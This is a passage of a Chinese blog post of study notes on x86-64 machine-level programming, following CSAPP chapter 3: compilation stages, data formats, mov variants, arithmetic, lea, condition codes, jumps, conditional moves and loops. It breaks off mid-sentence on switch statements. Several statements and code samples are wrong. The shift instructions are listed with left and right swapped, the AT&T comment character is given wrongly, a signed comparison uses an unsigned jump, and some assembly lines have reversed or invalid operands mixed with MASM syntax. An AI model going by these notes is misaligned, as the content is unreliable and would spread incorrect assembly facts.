    <content type="html"><![CDATA[<p>咕了有点久了，赶紧把新的章节预习完，捡出重点知识写一写文章。</p><span id="more"></span><h2 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h2><h3 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h3><p>Intel 系列处理器俗称 x86，经历了一系列的发展变化，从最初的四位，到16位微处理器 8086，32位的 i386 以及64位的 x86-64。</p><p>摩尔定律：芯片上的晶体管数量没过一年都会增长一倍，而事实正如所预料的这么发展，计算机科学的技术正以指数级的量级发展。</p><p>计算机只能够认识机器语言，只有机器语言能够直接被执行，如今的高级语言提供的抽象级别较高，较高的抽象级别可以提高工作效率，也能提高可靠性，在过渡到低级语言（汇编，机器语言）的时候编译器也能帮助我们发现程序的错误。虽然高级语言在各方面都能碾压低级语言，不论是在前面说的工作效率可靠性，还是可移植性方面。但是并不不是说我们就没有必要学习低级语言了，因为低级语言也由人为创建，也会产生漏洞，如果语言出现底层的逻辑漏洞，那么光从高级语言去查是永远不会查出结果的，这也是我们需要学习低级语言的原因。在了解了汇编语言，机器语言之后，你也会发现，计算机漏洞并不那么难以理解。</p><h3 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h3><p>比如有一个程序：test.c，我们用如下命令编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gcc -g test.c -o test</span><br></pre></td></tr></table></figure><p>这样编译出一个可执行的 test 文件，事实上，这一个命令调用了一整套的程序，程序拆解下来大致分为四步：</p><ol><li>预编译</li><li>编译</li><li>汇编</li><li>链接</li></ol><p>预编译会将 #include 所包含的文件展开以及 #define 申明指定的宏，生成 test.i。</p><p>编译会将高级语言翻译为低级语言，也就是汇编语言，生成 test.s。</p><p>汇编会将汇编语言转为对应的机器码，生成可重定向文件 test.o。到了这一步，程序仍不能独立运行，因为它缺少了相应的库函数和程序入口函数 _start 也没有填充全局的地址。</p><p>链接会将目标代码与库(libc.so.6)的代码合并，最终产生可执行文件 test。</p><p>我们可以使用以下四个命令来模拟每一步的过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$gcc -E test.c -o test.i</span><br><span class="line">$gcc -S test.i -o test.s</span><br><span class="line">$gcc -c test.s -o test.o</span><br><span class="line">$gcc -g test.o -o test [--static]</span><br></pre></td></tr></table></figure><p>在最后一步链接的时候，我们可以添加参数 –static 进行静态链接，或者不加参数默认动态链接。静态链接时，产生的可执行文件会非常大，而动态链接产生的可执行文件相对较小，每一个静态链接的文件被执行，都会把库函数的代码写进内存当中，而动态链接则不会，因此静态链接比动态链接会耗费更多的内存。但是静态链接的文件可以脱离库(libc.so.6) 运行，而动态链接必须依赖库运行，编译出来的文件放在不同版本的环境运行下可能会有较大差别，因此静态链接的可以执行比动态链接强。</p><h4 id="机器级代码"><a href="#机器级代码" class="headerlink" title="机器级代码"></a>机器级代码</h4><p>对于机器级编程来说，两种抽象比较重要：指令集体系结构或指令架构(ISA)定义了机器级程序的格式和行为，第二种抽象是内存地址为虚拟地址，提供的内存模型是非常大的字节数组。</p><p>一些对 C语言 程序员隐藏的处理状态对于机器代码是可见的。</p><ul><li>程序计数器（PC），在 x86-64 种以 %rip 寄存器表示程序要执行的下一条指令的地址。</li><li>寄存器</li><li>状态寄存器</li><li>向量寄存器</li></ul><p>在汇编代码中，不区分有符号无符号，不区分普通类型和指针类型，而操作系统负责把虚拟地址翻译成实际处理器内存中的物理地址。</p><p>机器执行的程序就是一个字节序列，是对一系列指令的编码，机器对产生这些指令的源代码几乎一无所知。</p><p>如果我们想查看一个可重定向文件或者是可执行 ELF 文件的字节码和它的反汇编指令的话，我们可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$objdump -d xxx.o</span><br><span class="line">$objdump -d ELFfile</span><br></pre></td></tr></table></figure><p>机器码具有如下特性：</p><ul><li>指令可以从任意地址编码，无对齐规则，只是任意地址开始的编码很可能产生错误的编码或者是运行产生错误的结果。</li><li>指令长度从1-15个字节不等，运用了哈夫曼编码的思想：越常用的指令字节数越少，越不常用的指令字节数越多。</li><li>反汇编器只是根据字节序列确定汇编代码，它完全不需要知道编译出该程序的源文件即可得到。</li></ul><p>汇编代码有 AT&amp;T 和 Intel 两种风格，在本书当中，基本使用的是 AT&amp;T 风格的汇编。</p><table><thead><tr><th>风格区别</th><th>intel</th><th>AT&amp;T</th></tr></thead><tbody><tr><td>注释</td><td>;</td><td>//</td></tr><tr><td>指令</td><td>无后缀</td><td>需要后缀指定数据长度</td></tr><tr><td>立即数</td><td>直接写常数</td><td>需要加$前缀</td></tr><tr><td>寄存器</td><td>直接写寄存器名称</td><td>需要加%前缀</td></tr><tr><td>指令书写风格</td><td>通常源操作数在后，目的在前</td><td>源操作数在前，目的在后</td></tr><tr><td>间接寻址</td><td>方括号里面可以直接写表达式</td><td>圆括号，只能计算ax+y+b的地址</td></tr></tbody></table><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><p>由于 Intel 用术语 “字(word)”表示16位的数据类型，因此 32 位数被称为 “双字(double words)”，64位数被称为 “四字(quad words)”。</p><p>在多少位的系统当中，指针就是多少位的，因此64位系统当中，指针类型的数据一律是四字，下面给出常见 C 的数据类型和数据长度。</p><table><thead><tr><th>C声明</th><th>Intel数据类型</th><th>汇编代码后缀</th><th>大小（字节）</th></tr></thead><tbody><tr><td>char</td><td>字节</td><td>b</td><td>1</td></tr><tr><td>short</td><td>字</td><td>w</td><td>2</td></tr><tr><td>int</td><td>双字</td><td>l</td><td>4</td></tr><tr><td>long</td><td>四字</td><td>q</td><td>8</td></tr><tr><td>char *</td><td>四字</td><td>q</td><td>8</td></tr><tr><td>float</td><td>单精度</td><td>s</td><td>4</td></tr><tr><td>double</td><td>双精度</td><td>l</td><td>8</td></tr></tbody></table><p>不过这里需要注意的是：虽然双字和双精度的后缀看似起了冲突实则没有冲突，因为浮点运算有自己独立的指令，并不影响。</p><h3 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h3><p>这里需要介绍以下寄存器，16位机器中，我们的通用寄存器有8个：ax,bx,cx,dx,di,si,sp,bp。对于前四个寄存器来说，把 x 替换成l 表示对应寄存器的低八位数据，替换成 h 则表示高 8 位数据。后面发展到了 32 位系统，寄存器也扩展到了 32 位，于是便于区分，在对应寄存器的名字前加上 e（expand 扩展）表示 32 位的寄存器，此时我们仍可以用 ax 表示 eax 的低 16 位，al 表示 eax 的低 8 位。到了 64 位之后，为了区分，把所有的 e 替换成了 r（register 寄存器）。并且新增了 8 个寄存器 r8~r15。</p><p>除此之外还有一个很特殊的寄存器：ip，它指示了当前运行指令的地址，也就是我们广义所称的 PC 程序计数器。</p><h4 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h4><p>以下内容建议全文背诵。</p><p>大多数指令会有一个到两个操作数（operand），操作数可以是立即数（immediate），寄存器（register）或者是内存地址。具有两个操作数的指令会分源操作数（source operand）和目的操作数（destination operand）。</p><p>在有两个操作数的情况下：源操作数可以是以上三种的任意，目的操作数不能为立即数，并且源操作数和目的操作数不能同时为内存地址。</p><p>单操作数指令具体情况具体分析。</p><p>我们主要介绍第三类的操作数，也就是内存地址引用。书上介绍的场景比较多，我们直接介绍最一般的形式：</p><p>$Imm(x,y,z)表示了地址为 x+yz+$Imm 的内存空间。</p><h4 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h4><h5 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h5><p>我们最频繁用到的指令就是数据传送指令了，它的作用就是将源操作数的值传给目的操作数，限制于上面介绍的一样。为了区分不同的版本，我们有 movb,movw,movl,movq 分别表示 传送字节，传送字，传送双字，传送四字。但是需要注意有一个例外，在传送双字（movl）的时候，如果目的操作数为一个寄存器，则此命令会将寄存器的高四个字节全部置为 0。</p><p>而有这么一种情况，当目的寄存器字长较长，而源操作数字长较短时，我们需要对源操作数进行扩展，而扩展就引发了两种情况：符号（sign）扩展（movs）和零（zero）扩展（movz）。这样则又能引发 11 种不同的 mov 指令。从字节扩展到字，双字，四字。从字扩展到双字和四字，零扩展种没有从双字扩展到四字的指令，因为 movl 指令已经能帮我们自动零扩展了。</p><p>因此这里就有五种指令，再符号扩展和零扩展算一下就是 10 条指令了，再加上双字的符号扩展，就有 11 种类型了。</p><table><thead><tr><th>指令MOV S,R</th><th>描述</th></tr></thead><tbody><tr><td>movzbw</td><td>从字节零扩展到字</td></tr><tr><td>movzbl</td><td>从字节零扩展到双字</td></tr><tr><td>movzbq</td><td>从字节零扩展到四字</td></tr><tr><td>movzwl</td><td>从字零扩展到双字</td></tr><tr><td>movzwq</td><td>从字零扩展到四字</td></tr><tr><td>movsbw</td><td>从字节符号扩展到字</td></tr><tr><td>movsbl</td><td>从字节符号扩展到双字</td></tr><tr><td>movsbq</td><td>从字节符号扩展到四字</td></tr><tr><td>movswl</td><td>从字符号扩展到双字</td></tr><tr><td>movswq</td><td>从字符号扩展到四字</td></tr><tr><td>movslq</td><td>从双字符号扩展到四字</td></tr></tbody></table><p>这里其实也是很好记的，就是mov后面多三个后缀嘛，第一个字表示符号扩展（s）还是零扩展（z），第二个字符表示源操作数字长（字节b，字w，双字l），三个字符表示目的操作数字长（字w，双字l，四字q），这样就好记多了。</p><p>关于符号扩展和零扩展的区别，其实很简单，若源操作数是正数，也就是说在它字的范围内最高位为 0，符号扩展和零扩展是一样的，把高位无脑填 0 即可，如果从有符号角度来看为负数，也就是说在它字的范围内最高位为 1，符号扩展则会把高位全部填充为 1，而零扩展还是把高位填充为 0。</p><h5 id="入栈（push），出栈（pop）指令"><a href="#入栈（push），出栈（pop）指令" class="headerlink" title="入栈（push），出栈（pop）指令"></a>入栈（push），出栈（pop）指令</h5><p>这两个指令本质也是数据传送指令，只不过它们只对栈进行操作。</p><p>push 是入栈指令，push S 的作用是把栈抬高八个字节（视操作系统位数而定），再将源操作数 S 放入开辟出来的栈空间中。</p><p>pop 是出栈指令，pop D 的作用是把内存栈顶的八个字节数据传送到目的操作数 D 当中，再将栈降低八个字节。</p><p>这里需要注意的是，这里的源操作数和目的操作数均不能为内存地址，因为 push 的目的操作数已经是栈里面的内存了，如果源操作数也是内存就违反了规定， Intel 是不允许我们直接将两个内存地址进行交换的，pop 同理，因此 push 的源操作数只能是立即数或者是寄存器， pop 的目的操作数只能是寄存器。</p><h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h4><p>对于计算机来说，最重要的当然还是进行数据运算啦，我们一般运算就分为算数运算和逻辑运算，当然还有浮点运算，不过那个过于复杂我们不讨论，我们只讨论前两个。</p><h5 id="一元运算"><a href="#一元运算" class="headerlink" title="一元运算"></a>一元运算</h5><table><thead><tr><th>指令</th><th>效果</th></tr></thead><tbody><tr><td>INC D</td><td>自增（D++）</td></tr><tr><td>DEC D</td><td>自减（D–）</td></tr><tr><td>NEG D</td><td>取负（-D）</td></tr><tr><td>NOT D</td><td>取反（~D）</td></tr></tbody></table><p>这四条指令比较简单，不做详细分析</p><h5 id="二元运算"><a href="#二元运算" class="headerlink" title="二元运算"></a>二元运算</h5><table><thead><tr><th>指令</th><th>效果</th></tr></thead><tbody><tr><td>ADD S,D</td><td>D+=S</td></tr><tr><td>SUB S,D</td><td>D-=S</td></tr><tr><td>IMUL S,D</td><td>D*=S（有符号）</td></tr><tr><td>MUL S,D</td><td>D*=S（无符号）</td></tr><tr><td>IDIV S,D</td><td>D/=S（有符号）</td></tr><tr><td>DIV S,D</td><td>D/=S（无符号）</td></tr><tr><td>XOR S,D</td><td>D^=S</td></tr><tr><td>OR S,D</td><td>D|=S</td></tr><tr><td>AND S,D</td><td>D&amp;=S</td></tr><tr><td>SAL S,D</td><td>D&gt;&gt;=S（有符号）</td></tr><tr><td>SAR S,D</td><td>D&lt;&lt;=S（有符号）</td></tr><tr><td>SHL S,D</td><td>D&gt;&gt;=S（无符号）</td></tr><tr><td>SHR S,D</td><td>D&lt;&lt;=S（无符号）</td></tr></tbody></table><p>这里需要注意：当左移右移的源操作数超过目的操作数的位数（w），那么它只会取得低 log2(w) （向上取整）位。</p><p>这些指令也有 b,w,l,q 的区别。</p><h5 id="加载有效地址（Load-Effective-Address）"><a href="#加载有效地址（Load-Effective-Address）" class="headerlink" title="加载有效地址（Load Effective Address）"></a>加载有效地址（Load Effective Address）</h5><p>lea指令用于加载有效地址，它其实就是 mov 指令的一个变形，用最直观的理解去讲，就是如果我 movq 8[%rdi,8,%rsi],%rax 的作用应该是把内存 %rdi+8*%rsi+8 这地址的八个字节给到 %rax 寄存器，而 简简单单把 movq 换成 leaq，就是不取值了，直接把算出来的地址，这个地址给到 %rax 寄存器。</p><p>它一般用于简单的计算比较多，比如以下代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">long</span> x,<span class="keyword">long</span> y)</span></span>&#123;</span><br><span class="line"><span class="comment">//x in %rdi,y in %rsi</span></span><br><span class="line"><span class="keyword">return</span> x+<span class="number">4</span>*y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们直接翻译成汇编是什么样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">mul proc</span><br><span class="line">subq $10h,%rsp</span><br><span class="line">movq %rsi,%rax</span><br><span class="line">imulq $4,%rax</span><br><span class="line">addq %rdi,%rax</span><br><span class="line">addq %10h,%rsp</span><br><span class="line">retq</span><br><span class="line">mul endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>当然我们目前学了这么多的知识也就允许我们写成这样了，但是如果我们用 LEA 指令就能大大缩短代码量，LEA 指令我们可以这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">mul proc</span><br><span class="line">subq $10h,%rsp</span><br><span class="line">leaq (%rdi,4,%rsi),%rax</span><br><span class="line">addq %10h,%rsp</span><br><span class="line">retq</span><br><span class="line">mul endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>没错，就这么简单了，所以我们一般用 LEA 指令最多只是用一些简单的运算，或者我本来想取一个全局变量的内存地址，但是我如果直接 mov 就变成了取它的值，于是我改用 LEA 指令就能取到它的地址了，我目前能理解的也只有这两种情况了。</p><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p>然而，单一的顺序结构并不能满足我们的需求，我们希望程序在某些时候有所选择，希望某些时候去做重复的工作，这个时候程序将不再是顺序执行，而是会跳转执行。</p><p>跳转分条件跳转和无条件跳转，无条件跳转执行之后，则程序必定跳转到它指定的位置。如果是这样，那么程序运行与之前的顺序运行没什么区别，要实现分支结构和循环结构就需要用到条件跳转了。</p><h4 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h4><p>在CPU当中，除了维护了 16 个整数寄存器外，我们还维护了一些状态寄存器（也称标志寄存器）。</p><p>常见的标志寄存器有</p><ul><li>CF：进位标记，是否产生了进位</li><li>ZF：零标记，最近得到的操作结果为0</li><li>SF：符号标记，最近得到了一个负数结果</li><li>OF：溢出标志，最近的操作导致一个补码溢出</li></ul><p>LEA 指令不会改变任何标志寄存器，INC 和 DEC 指令不会改变进位标志，有两个指令它们只改变标志位而不改变其它寄存器，那就是 cmp 指令和 test 指令。cmp 指令会与 sub 指令设置一样的标志位，但是不会改变目的操作数，test 指令则与 and 指令一样，但是也不会修改目的操作数，test 指令的常见用法就是 test %rax,%rax 来判断 %rax 的情况，当然这也可以看做是 cmp 0,%rax，与零做比较，又或者是进行掩码的与操作，根据结果判断某个标志位是否被设置。</p><h4 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h4><p>条件码不会被直接读取，它一般用于条件跳转，条件设置和条件转移，它们一般有如下后缀。</p><table><thead><tr><th>指令后缀</th><th>同义后缀</th><th>条件码</th><th>设置条件</th><th>英文释义</th></tr></thead><tbody><tr><td>e</td><td>z</td><td>ZF==1</td><td>相等（零）</td><td>equal（zero）</td></tr><tr><td>ne</td><td>nz</td><td>ZF==0</td><td>不相等（不为零）</td><td>not equal（not zero）</td></tr><tr><td>s</td><td>/</td><td>SF==1</td><td>为负数</td><td>sign（with -）</td></tr><tr><td>ns</td><td>/</td><td>SF==0</td><td>为非负数</td><td>not sign（without -）</td></tr><tr><td>g</td><td>nle</td><td>(SF^OF)==0&amp;ZF==0</td><td>有符号大于</td><td>greater（not [less or equal]）</td></tr><tr><td>ge</td><td>nl</td><td>(SF^OF)==0</td><td>有符号大于等于</td><td>greater or equal（not less）</td></tr><tr><td>l</td><td>nge</td><td>(SF^OF)==1</td><td>有符号小于</td><td>less （not [greater or equal]）</td></tr><tr><td>le</td><td>ng</td><td>(SF^OF)==1|ZF</td><td>有符号小于等于</td><td>less or equal （not greater）</td></tr><tr><td>a</td><td>nbe</td><td>CF==0&amp;ZF==0</td><td>无符号大于</td><td>above （not [below or equal]）</td></tr><tr><td>ae</td><td>nb</td><td>CF==0</td><td>无符号大于等于</td><td>above or equal （not below）</td></tr><tr><td>b</td><td>nae</td><td>CF==1</td><td>无符号小于</td><td>below （not [above or equal]）</td></tr><tr><td>be</td><td>na</td><td>CF|ZF==1</td><td>无符号小于等于</td><td>below or equal （not above）</td></tr></tbody></table><p>这里比较复杂的大概就是有符号和无符号大小于了吧，但是其实只要理解到位是不难记的。</p><h4 id="set指令"><a href="#set指令" class="headerlink" title="set指令"></a>set指令</h4><p>set 指令用于设置一个字节为全 1，它可以加入上述表中的条件后缀以用于条件设置。</p><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><p>无条件跳转可以使用直接跳转或者间接跳转，直接跳转比如 jmp *%rax，间接跳转就是对 %rax 所存的地址再次取值所得到的地址作为新的指令执行地址。</p><p>条件跳转指令的指令名称为 j + 条件后缀，比如 je 指令就是等于时跳转，条件跳转指令只能直接跳转，不能间接跳转。</p><h4 id="跳转指令的编码"><a href="#跳转指令的编码" class="headerlink" title="跳转指令的编码"></a>跳转指令的编码</h4><p>跳转指令表面上是要指定一个绝对地址，但是实际上编码的时候是采用了偏移量的方式去编码，它会根据跳转指令所编码的值去对自己的 %rip 寄存器加或者是减去一个偏移量，但是需要注意的是，偏移量是从下一条指令开始计算的，这也就是为什么 jmp 如果后面编码值为 0 不会产生一个死循环。</p><h4 id="条件控制语句实现条件分支"><a href="#条件控制语句实现条件分支" class="headerlink" title="条件控制语句实现条件分支"></a>条件控制语句实现条件分支</h4><p>比如这样的一个语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="comment">//x in %rdi,y in %rsi</span></span><br><span class="line"><span class="keyword">if</span>(x&gt;y)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们可以这样子写汇编语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">cmp proc</span><br><span class="line">mov $0,%rax</span><br><span class="line">cmp %rsi,%rdi</span><br><span class="line">jbe L1</span><br><span class="line">mov $1,%rax</span><br><span class="line">L1:</span><br><span class="line">ret</span><br><span class="line">cmp endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>如果有 if … else … 语句的话，一般采用条件跳转和无条件跳转组合的方式去实现，比如如下的表达式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(expr)&#123;</span><br><span class="line">truepart</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">falsepart</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进行编译之后大概率会产生如下的汇编语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test %rdi,%rdi</span><br><span class="line">jz L1</span><br><span class="line">//truepart</span><br><span class="line">jmp done</span><br><span class="line">L1:</span><br><span class="line">//falsepart</span><br><span class="line">done:</span><br><span class="line">//over</span><br></pre></td></tr></table></figure><h4 id="条件传送语句实现条件分支"><a href="#条件传送语句实现条件分支" class="headerlink" title="条件传送语句实现条件分支"></a>条件传送语句实现条件分支</h4><p>条件传送指令就和上面两类条件指令一模一样，符合条件时传送，不符合条件时不传送。</p><p>同样，如下语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//x in %rdi,y in %rsi</span></span><br><span class="line">    <span class="keyword">int</span> z;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;y)&#123;</span><br><span class="line">        z=x-y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        z=y-x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用条件跳转语句可以很轻松地实现上述逻辑，但是我们也可以使用条件传送语句，事先算出两个部分 z 的值，先赋值假设正确的值，再用条件传送语句判断错误的条件赋值。</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movq %rdi,%rax</span><br><span class="line">subq %rsi,%rax;let %rax=x-y</span><br><span class="line">movq %rsi,%rbx</span><br><span class="line">subq %rdi,%rbx;let %rbx=y-x</span><br><span class="line">cmp %rsi,%rdi</span><br><span class="line">cmovle %rbx,%rax;if x&lt;=y movq %rbx,%rax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>可能你会疑问，这样子效率会不会遍低，因为如果运算更复杂一点，我需要把两个值都算出来，执行的指令会变多。确实，条件跳转比条件转移比起来执行的指令少，而且能泛用性广，举个例子：如果 if … else … 里面有其它语句，比如输出语句，那么我们条件传送指令显然就不能用，而条件跳转能应对这种情况。</p><p>但是条件传送实现的条件分支比条件转移实现的分支运行速度快。你可能很惊讶，为什么执行的指令多反而运行速度还快了，那是因为当今的 CPU 都是流水作业，一个指令的执行分为五个步骤，它同一时间可以执行五条指令对应的不同操作。而流水作业的前提条件是我能清楚地知道我接下来要执行的代码，如果我都不知道我接下来要执行什么代码，那么我肯定不能很好的运用流水作业了。</p><p>条件控制语句在执行完毕之前，谁也不知道它是跳转或者不跳转，也就无法知道它接下来要执行的指令，我们只能选择等待条件跳转指令执行完毕再次填充指令流水作业，速度自然就慢了。而条件转移并不改变指令的执行顺序，因此它依然能利用 CPU 的流水作业。</p><table><thead><tr><th>实现分支的方式</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>条件跳转</td><td>能应对所有分支情况，执行的指令较少</td><td>执行速度慢，不能很好的利用CPU的指令流水</td></tr><tr><td>条件传送</td><td>执行速度快，能很好的利用CPU的流水作业</td><td>不能应对所有的分支状况，需要把所有的情况提前计算，执行的指令较多</td></tr></tbody></table><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>高级语言中，除了顺序，选择以外，还有一种结构就是循环结构了，但是事实上我们依然可以通过条件转移的方式实现循环的效果，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movq $10,%rcx;set loop time</span><br><span class="line">do:</span><br><span class="line">;do something</span><br><span class="line">subq $1,%rcx</span><br><span class="line">test %rcx,%rcx</span><br><span class="line">jns do</span><br></pre></td></tr></table></figure><p>以上例程可以循环10次执行，并且可以通过修改立即数 $10 来改变循环次数。</p><p>把它转为 C 语言来写就很像我们的 do-while 循环语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="comment">//something</span></span><br><span class="line">        i--;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&gt;=<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么除了 do - while 我们还有 while，for 三种类型的循环。</p><p>它们的模板分别是什么样的呢，我们来看看。</p><p>while 的 C 写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//something</span></span><br><span class="line">        i--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">movq $10,%rcx</span><br><span class="line">do:</span><br><span class="line">    subq $1,%rcx</span><br><span class="line">    test %rcx,%rcx</span><br><span class="line">    js end</span><br><span class="line">;do something</span><br><span class="line">jmp do</span><br><span class="line">end:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>for 的 C 写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"><span class="comment">//something</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movq %rcx,0</span><br><span class="line">do:</span><br><span class="line">;something</span><br><span class="line">addq %rcx,$1</span><br><span class="line">cmpq $10,%rcx</span><br><span class="line">jl do</span><br></pre></td></tr></table></figure><p>如果循环语句中有 continue，我们就跳过循环体中的所有逻辑，直接到循环条件判断和循环变量的修改，如果有 break 我们直接跳出循环即可。</p><p>要点：<strong>掌握循环结构的写法和循环的判断</strong>。</p><h4 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h4><p>其实有人说，switch 就可以理解为  if elseif else if … 的形式，其实从实现来说，两者并没有太大的差别，但是执行效率上会有巨大差别，如果语句在第 n+1 